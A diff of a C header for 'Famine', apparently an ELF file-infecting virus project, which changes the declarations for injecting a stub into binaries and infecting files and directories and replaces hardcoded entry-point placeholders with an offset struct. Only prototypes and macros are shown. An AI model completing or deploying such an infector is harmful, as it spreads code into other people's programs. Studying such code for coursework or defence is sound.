@@ -17,14 +17,12 @@
 # include <limits.h>
 # include "./m_std.h"
 
-# if DEBUG
+# if DEBUG && !NOSTD
 #  include <stdio.h>
 #  define LOG(...) fprintf(stderr, __VA_ARGS__)
 # else
 #  define LOG(...) ((void)0)
 # endif
-
-# define FAMINE_SIG "Famine version 1.0 (c)oded by cbopp-mvan-wij"
 
 /*
  * Elf64_Ehdr (file header)
@@ -48,12 +46,10 @@
 
 # define PAGE_SIZE	0x1000
 
-/* sentinels patched inside the stub at injection time */
-# define PLACE_ENTRY	0xAAAAAAAAAAAAAAAAULL
-# define PLACE_PHDR		0xFEEDFACEFEEDFACEULL
-
+#if !CREATE_STUB
 extern unsigned char	stub_bin[];
 extern unsigned int		stub_bin_len;
+#endif
 
 typedef struct s_famine
 {
@@ -67,15 +63,22 @@ typedef struct s_famine
 	uint64_t	stub_vaddr; // vaddr chosen for the stub segment
 }	t_famine;
 
+typedef struct placeholders {
+	size_t placeholders;
+	size_t entry;
+	size_t phdr;
+	size_t stub_len;
+}	t_placeholders;
+
 // elf.c
 int			is_valid_elf(const Elf64_Ehdr *elf, off_t size);
 int			find_segments(t_famine *f);
 uint64_t	highest_vaddr_end(const t_famine *f);
 
-void		inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len);
+void		inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
 
-int			infect_file(const char *path, const unsigned char *stub, size_t stub_len);
+int			infect_file(const char *path, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
 
-void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len);
+void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset);
 
 #endif
